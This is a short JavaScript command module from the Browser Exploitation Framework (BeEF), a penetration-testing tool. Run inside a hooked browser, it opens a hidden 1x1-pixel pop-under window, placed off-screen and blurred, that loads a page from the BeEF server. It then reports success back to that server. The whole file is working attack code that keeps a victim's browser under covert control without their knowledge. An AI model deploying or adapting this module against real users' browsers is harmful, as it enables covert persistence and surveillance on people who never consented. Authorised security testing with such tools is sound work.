//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	
	var result = "Pop-under window successfully created!";

	window.open('http://' + beef.net.host + ':' + beef.net.port + '/demos/plain.html','popunder','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();

	window.focus();	

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
});
